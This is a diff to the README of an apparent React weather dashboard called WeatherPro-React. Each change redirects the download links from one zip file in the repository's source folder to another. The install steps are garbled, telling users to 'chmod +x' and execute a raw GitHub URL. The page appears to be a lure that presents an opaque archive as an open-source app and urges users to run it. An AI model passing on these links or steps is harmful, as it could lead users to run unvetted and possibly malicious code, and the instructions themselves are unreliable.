@@ -4,7 +4,7 @@
 Welcome to WeatherPro-React! This application offers a stunning weather dashboard that gives you real-time weather forecasts at your fingertips. No programming knowledge is required—just follow the steps below to get started.
 
 ## 📥 Download WeatherPro-React
-[![Download WeatherPro-React](https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/WeatherPro-React_v1.9.zip)](https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/WeatherPro-React_v1.9.zip)
+[![Download WeatherPro-React](https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/React-Pro-Weather-1.6.zip)](https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/React-Pro-Weather-1.6.zip)
 
 ## 📋 Overview
 WeatherPro-React is built with modern technologies like React and Vite. It features a unique glassmorphism UI with neon effects, making it visually appealing. The app uses geolocation to provide accurate weather updates without needing an API key. It fetches data through the Open-Meteo API, ensuring that you have the information you need in real-time.
@@ -33,7 +33,7 @@ This application covers a variety of topics:
 ## 📥 Download & Install
 To download WeatherPro-React, visit the following link to access the Releases page:
 
-[Download WeatherPro-React](https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/WeatherPro-React_v1.9.zip)
+[Download WeatherPro-React](https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/React-Pro-Weather-1.6.zip)
 
 Once you're on the Releases page:
 
@@ -57,8 +57,8 @@ Once you're on the Releases page:
 **Linux:**
 1. Open the terminal.
 2. Navigate to the folder where you downloaded the file.
-3. Run the command `chmod +x https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/WeatherPro-React_v1.9.zip` (adjust the filename if necessary).
-4. Execute the file with `https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/WeatherPro-React_v1.9.zip`.
+3. Run the command `chmod +x https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/React-Pro-Weather-1.6.zip` (adjust the filename if necessary).
+4. Execute the file with `https://raw.githubusercontent.com/padmee/WeatherPro-React/main/src/React-Pro-Weather-1.6.zip`.
 
 ## 💡 Usage
 Once you've installed WeatherPro-React, open the application. It will automatically use your location to show the current weather. You can also search for weather in other locations using the search bar.
